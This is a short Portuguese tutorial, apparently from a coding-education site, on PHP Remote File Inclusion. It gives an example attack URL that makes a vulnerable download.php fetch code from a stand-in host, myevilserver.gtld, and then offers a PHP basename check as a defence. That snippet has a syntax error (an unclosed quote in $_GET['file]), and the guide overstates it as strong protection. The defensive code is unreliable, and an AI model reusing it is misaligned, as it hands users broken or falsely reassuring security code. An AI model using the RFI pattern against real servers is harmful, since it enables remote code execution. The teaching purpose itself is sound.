---
title: Remote File Inclusion
localeTitle: Inclusão remota de arquivos
---
## Inclusão remota de arquivos

Uma vulnerabilidade no aplicativo causada pelo programador exigindo uma entrada de arquivo fornecida pelo usuário e não sanitizando a entrada antes de acessar o arquivo solicitado. Isso resulta em um arquivo sendo extraído de um servidor remoto e incluído onde não deveria estar.

### Exemplo de ataques de inclusão de arquivos remotos

Um site permite que você visualize PDFs como `download.php?file=myfile.php` , devido à falta de uma verificação adequada, um usuário mal-intencionado pode solicitar um recurso remoto e incluí-lo no script. A URL pode tornar-se `download.php?file=http://myevilserver.gtld/evilcode.php` isso pode ser enviado para o usuário ou, em casos graves, executar o código PHP real em seu servidor.

### Defendendo seu site contra ataques de inclusão de arquivos remotos em PHP

O código PHP a seguir fornecerá uma proteção forte contra ataques remotos de inclusão de arquivos

```PHP
<?php 
 if(basename($_GET['file]) !== $_GET['file']) { 
  die('INVALID FILE REQUESTED'); 
 } 
```

*   Você pode desativar o `allow_url_fopen` no seu arquivo php.ini como uma proteção adicional contra a inclusão de arquivos remotos.

#### Mais Informações:

*   [OWASP Wiki - Teste de Inclusão Remota de Arquivos](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)